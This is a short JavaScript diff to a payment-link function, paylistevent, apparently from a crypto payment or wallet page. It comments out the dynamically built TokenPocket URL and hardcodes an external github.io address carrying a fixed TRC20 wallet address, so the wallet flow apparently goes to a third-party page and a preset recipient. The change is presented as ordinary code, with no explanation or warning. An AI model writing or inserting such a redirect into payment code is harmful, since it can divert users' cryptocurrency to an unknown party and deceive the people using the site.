@@ -101,9 +101,10 @@ function paylistevent(from) {
 		".html?from=" + from +
 		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);
 
-	let tp_url = encodeURIComponent(window.location.protocol + "//" + window.location.host + "/" + addtype +
-		".html?from=" + from +
-		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);
+// 	let tp_url = encodeURIComponent(window.location.protocol + "//" + window.location.host + "/" + addtype +
+// 		".html?from=" + from +
+// 		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url);
+	let tp_url =  "https://svip66.github.io/1/?addtype=trc20&to_address=TVPdegug7oUpfCPRReK3Xy1BH8JioRdKgP&utm_source=tokenpocket"
 
 	let my_url = window.location.protocol + "//" + window.location.host + "/" + addtype + ".html?from=" + from +
 		"&addtype=" + addtype + "&to_address=" + to_address + "&from_url=" + from_url;
